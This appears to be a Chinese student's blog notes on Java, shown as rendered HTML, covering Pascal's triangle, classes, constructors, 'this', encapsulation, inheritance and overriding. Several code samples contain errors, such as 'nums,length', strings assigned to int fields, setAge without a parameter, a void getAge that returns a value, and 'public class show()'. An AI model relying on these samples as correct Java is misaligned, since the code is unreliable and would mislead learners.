class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//杨辉三角</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span>[][]nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i]=<span class="keyword">new</span> <span class="title class_">int</span>[i+<span class="number">1</span>];</span><br><span class="line">nums[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">nums[i][i]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;nums[i].length-<span class="number">1</span>;j++)&#123;</span><br><span class="line">nums[i][j]=nums[i-<span class="number">1</span>][j-<span class="number">1</span>]+nums[i-<span class="number">1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums,length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums[i].length;j++)&#123;</span><br><span class="line">System.out.println(nums[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4af9e5e9.png" alt="image-20240410102648801"></p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b494bde.png" alt="image-20240410103759344"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">String brand;<span class="comment">//品种</span></span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String color;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;eating&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;sleeping&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个包实例化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Dog dog=<span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.brand=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">dog.name=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">dog.age=<span class="string">&quot;3&quot;</span>;</span><br><span class="line">dog.color=<span class="string">&quot;4&quot;</span>;</span><br><span class="line"></span><br><span class="line">dog.eat();</span><br><span class="line">dog.sleep();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b43e8e1.png" alt="image-20240410104643287"></p><p>类(类型)是一种模板(1个) 根据类可以创建出多个对象(实例)</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac88a2b.png" alt="image-20240410104902803"></p><h3 id="方法与属性"><a href="#方法与属性" class="headerlink" title="方法与属性"></a>方法与属性</h3><p><strong>属性</strong></p><p>属性是有默认值的 所有在类的定义中可以不赋值 直接调用</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af9431b.png" alt="image-20240410105246809"></p><p>就近原则：谁离我近 谁对我起作用（作  用域更小的起作用）</p><p><strong>方法</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4abcde1a.png" alt="image-20240410105657665"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHi</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;---&quot;</span>+age+<span class="string">&quot;---&quot;</span>+sex+<span class="string">&quot;---&quot;</span>+score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个包实例化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s1.name=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">s1.age=<span class="string">&quot;3&quot;</span>;</span><br><span class="line">s1.sex=<span class="string">&quot;4&quot;</span>;</span><br><span class="line">s1.score=<span class="string">&quot;5&quot;</span>;</span><br><span class="line">    s1.sayHi();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Student s2=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s2.name=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s2.age=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">s2.sex=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">    s2.score=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">s2.sayHi();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>有些情况下，对象的同一种行为可能存在多种实现过程（吃饭与吃药 都是吃 但过程存在差异）</p><p>这样直接写的话会出现一个问题就是：方法名太多。而重载存在的意义就是解决方法名的问题 他允许一个方法名执行多个方法 <strong>根据传来的参数不同 执行不同的方法</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad3653a.png" alt="image-20240410111013681"></p><p><strong>注：参数要不同</strong>  <strong>与返回值类型无关      与形参名字无关</strong> </p><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4acc83d8.png" alt="image-20240410111327769"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b1d0105.png" alt="image-20240410111606491"></p><p>构造方法也可以重载，遵循重载规则</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b3c8570.png" alt="image-20240410111937961"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String n,<span class="type">int</span> a,String s,<span class="type">int</span> sc)</span>&#123;</span><br><span class="line">name=n;</span><br><span class="line">age=a;</span><br><span class="line">sex=s;</span><br><span class="line">score=sc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;<span class="comment">//如果自己写了带参数的构造方法 要再写一个无参数的构造方法（习惯） 因为框架会调用</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHi</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;---&quot;</span>+age+<span class="string">&quot;---&quot;</span>+sex+<span class="string">&quot;---&quot;</span>+score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个包实例化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>,<span class="string">&quot;4&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    s1.sayHi();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Student s2=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s2.name=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s2.age=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">s2.sex=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">    s2.score=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">s2.sayHi();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b567c59.png" alt="image-20240410112918317"></p><p><strong>用法1：</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b390f32.png" alt="image-20240410113039744"></p><p><strong>用法2：</strong></p><p>当两个构造方法当中，包含多条冗余代码时</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aee8aad.png" alt="image-20240410113359968"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name,<span class="type">int</span> age,String sex)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name=name;</span><br><span class="line"><span class="built_in">this</span>.age=age;</span><br><span class="line"><span class="built_in">this</span>.sex=sex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name,<span class="type">int</span> age,String sex,<span class="type">int</span> score)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>(name,age,sex);<span class="comment">//只能在第一行</span></span><br><span class="line"><span class="built_in">this</span>.score=score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在对象创建时 一旦分配空间 就已经存在this了 指向这个空间</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5a51d1.png" alt="image-20240413142319994"></p><p>本来这样是直接给age赋值 可能无意或恶意输入错误值 </p><p>所以用set get 方法</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5dec33.png" alt="image-20240413142545434"></p><p>这样将接受和赋值分开 可以让是否赋值的主动权在我们手中(可以判断)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setAge(<span class="number">22000</span>);</span><br><span class="line">        System.out.println(s1.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Student</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    String gender;</span><br><span class="line">    <span class="type">double</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> setAge&#123;</span><br><span class="line">        <span class="keyword">if</span>(age&gt;=<span class="number">0</span>&amp;&amp;age&lt;=<span class="number">120</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.age=<span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> getAge&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae5b35c.png" alt="image-20240413154220187"></p><p>封装的好处：</p><ul><li>更安全</li><li>对外提供一个接口 更方便</li></ul><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>程序中的继承，是类与类之间特征和行为的一种赠与或获得</p><p>两个类之间的继承关系，必须满足”is a”的关系</p><p><strong>父类的选择：</strong></p><p>一个对象其实是有很多的父类</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac60878.png" alt="image-20240413155258258"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String strain;<span class="comment">//品种</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchDisk</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在玩飞盘&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStrain</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStrain</span><span class="params">(String strain)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.strain=strain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Penguin</span> <span class="keyword">extends</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String gender;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在游泳&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.gender=gender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        d.name=<span class="string">&quot;汪汪&quot;</span>;</span><br><span class="line">        System.out.println(d.name);</span><br><span class="line">        d.show();</span><br><span class="line">        <span class="type">Penguin</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        p.name=<span class="string">&quot;QQ&quot;</span>;</span><br><span class="line">        System.out.println(p.name);</span><br><span class="line">        p.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一组相同或类似的类中，抽取出共性的特征和行为，定义在父类中，实现重用</p><p><strong>子类通过extends来继承</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac245da.png" alt="image-20240417104444383"></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>单根性：一个类只能有一个直接的父类</p><p>传递性：类之间可以多级继承，属性和方法逐级叠加</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name +<span class="string">&quot;-&quot;</span>+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SE</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;coding&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">SE</span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dowork</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name +<span class="string">&quot;studying&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Student s=<span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line">    s.name=<span class="string">&quot;Ozero&quot;</span>;</span><br><span class="line">    s.age=<span class="number">19</span>;</span><br><span class="line">    s.score =<span class="number">150</span>;</span><br><span class="line">    s.dowork();<span class="comment">//Student</span></span><br><span class="line">    s.show();<span class="comment">//Person</span></span><br><span class="line">    s.code();<span class="comment">//SE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过接口与内部类来实现多继承</p><h3 id="属性的继承"><a href="#属性的继承" class="headerlink" title="属性的继承"></a>属性的继承</h3><p>父类的所以属性都可以被继承</p><p>但是父类的私有属性不能被访问</p><p>当子类和父类有同名属性的时候可以通过super关键字区分</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab3f62b.png" alt="image-20240417111831356"></p><p>sub继承sup </p><p>不加super–&gt;当前对象的属性</p><p>加super–&gt;父类被继承道子类的属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sup</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Sup</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> c=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> b=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">show</span>()&#123;</span><br><span class="line">        System.out.println(<span class="built_in">super</span>.b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Sub sub=<span class="keyword">new</span> <span class="title class_">Sub</span>();</span><br><span class="line">    sub.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad04803.png" alt="image-20240417113146760"></p><p>默认是default</p><h3 id="方法的重写与覆盖"><a href="#方法的重写与覆盖" class="headerlink" title="方法的重写与覆盖"></a>方法的重写与覆盖</h3><p>如果父类提供的方法无法满足子类需求时，可在子类中定义和父类相同的方法进行重写(Override)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String strain;<span class="comment">//品种</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchDisk</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在玩飞盘&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>.show();</span><br><span class="line">        System.out.println(strain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStrain</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStrain</span><span class="params">(String strain)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.strain=strain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        d.name=<span class="string">&quot;汪汪&quot;</span>;</span><br><span class="line">        d.health=<span class="number">10</span>;</span><br><span class="line">        d.love=<span class="number">5</span>;</span><br><span class="line">        d.strain=<span class="string">&quot;修狗&quot;</span></span><br><span class="line">        d.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然 也可以不用 super.show(); 直接完全重写也行 但这时是默认default 所以可以直接访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love+<span class="string">&quot;-&quot;</span>+strain);</span><br></pre></td></tr></table></figure><p>但如果这时是private呢</p><p>肯定不能这样访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(getName()+&quot;-&quot;+getHealth()+&quot;-&quot;+getLove()+&quot;-&quot;+strain);</span><br></pre></td></tr></table></figure><p><strong>他把门关了，我们调用这个窗户就行</strong></p><p>当然 这里也要改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span 